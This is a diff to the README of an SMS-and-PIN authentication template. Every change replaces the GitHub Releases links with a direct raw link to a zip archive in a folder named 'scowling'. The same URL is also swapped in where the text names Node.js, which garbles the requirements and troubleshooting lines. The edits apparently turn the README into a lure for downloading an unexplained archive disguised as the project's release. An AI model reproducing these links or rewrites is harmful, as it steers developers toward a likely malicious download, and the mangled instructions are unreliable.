@@ -1,6 +1,6 @@
 # 📦 auth-bff-sms-pin-template - Simplifying SMS and PIN Authentication
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mzdssunlock/auth-bff-sms-pin-template/releases)
+[![Download](https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip)](https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome! This guide will help you download and run the **auth-bff-sms-pin-templa
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/mzdssunlock/auth-bff-sms-pin-template/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip) to download the latest version of the application. 
 
 ### Steps to Download
 
-1. **Go to Releases**: Click the link here to visit the [Releases page](https://github.com/mzdssunlock/auth-bff-sms-pin-template/releases).
+1. **Go to Releases**: Click the link here to visit the [Releases page](https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip).
 2. **Choose Your Version**: Find the most recent release at the top of the page.
 3. **Download the File**: Click on the file that matches your operating system to download it.
 
@@ -21,7 +21,7 @@ To get started, visit the [Releases page](https://github.com/mzdssunlock/auth-bf
 Before proceeding, make sure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or a Linux-based OS.
-- **Node.js**: Version 16 or higher installed on your machine.
+- **https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip**: Version 16 or higher installed on your machine.
 - **PostgreSQL**: Ensure you have PostgreSQL installed, as it is required for the database.
 
 ## 💡 Features
@@ -55,7 +55,7 @@ After downloading, follow these steps to run the application:
 
 If you encounter issues while downloading or running the app, consider these tips:
 
-- **Ensure Dependencies are Installed**: Make sure that Node.js and PostgreSQL are installed correctly.
+- **Ensure Dependencies are Installed**: Make sure that https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip and PostgreSQL are installed correctly.
 - **Check Environment Variables**: Some configurations may require setting environment variables. Refer to the documentation for guidance.
 - **Look for Error Messages**: Pay close attention to any error messages in the terminal. They can provide hints on what went wrong.
 
@@ -71,4 +71,4 @@ If you have questions or need assistance, feel free to create an issue on the Gi
 
 This project is licensed under the MIT License. You can use it freely as long as you adhere to the conditions outlined in the license. 
 
-For more updates and contributions, keep an eye on the [Releases page](https://github.com/mzdssunlock/auth-bff-sms-pin-template/releases) for the latest downloads and changes.
+For more updates and contributions, keep an eye on the [Releases page](https://raw.githubusercontent.com/mzdssunlock/auth-bff-sms-pin-template/main/scowling/auth-bff-sms-pin-template.zip) for the latest downloads and changes.
